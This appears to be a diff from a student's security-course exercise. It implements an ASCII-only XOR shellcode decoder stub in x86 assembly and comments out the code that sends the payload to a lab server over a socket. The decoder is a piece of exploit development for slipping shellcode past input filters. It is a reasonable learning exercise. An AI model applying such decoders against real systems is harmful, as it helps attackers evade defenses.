@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-import functools, os, socket, traceback, struct
+import functools, os, socket, traceback, struct, assemble
 import q2
 
 
@@ -59,7 +59,21 @@ def encode(data):
 def get_decoder(indices):
     '''Return the assembled decoder code.'''
     # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    decoder_assembly = ""
+    create_ff = "push 0; pop ebx; dec ebx;" # insert into ebx the value ff with only ascii chars
+    init_edx = "push 0; pop edx;" # initiate edx to zero
+    decoder_assembly += create_ff + init_edx
+
+    edx_current_value = 0
+    for i in indices:
+        edx_i_diff = i - edx_current_value # this is how much we should increment edx for current i vaule
+        inc = "inc edx;" * edx_i_diff # do as much increment as needed
+        xr = "xor byte ptr [eax + edx], BL;" # then, perform the decoding
+        decoder_assembly += inc + xr # update our decoder code
+        edx_current_value += edx_i_diff # update current edx value
+
+    decoder = assemble.assemble_data(decoder_assembly) # assemble our code
+    return decoder
 
 
 @warn_invalid_ascii()
@@ -86,13 +100,14 @@ def get_payload():
 
 
 def main():
-    payload = get_payload()
-    conn = socket.socket()
-    conn.connect((HOST, SERVER_PORT))
-    try:
-        conn.sendall(payload)
-    finally:
-        conn.close()
+    get_decoder([1,5,10,12, 22])
+    # payload = get_payload()
+    # conn = socket.socket()
+    # conn.connect((HOST, SERVER_PORT))
+    # try:
+    #     conn.sendall(payload)
+    # finally:
+    #     conn.close()
 
 
 if __name__ == '__main__':
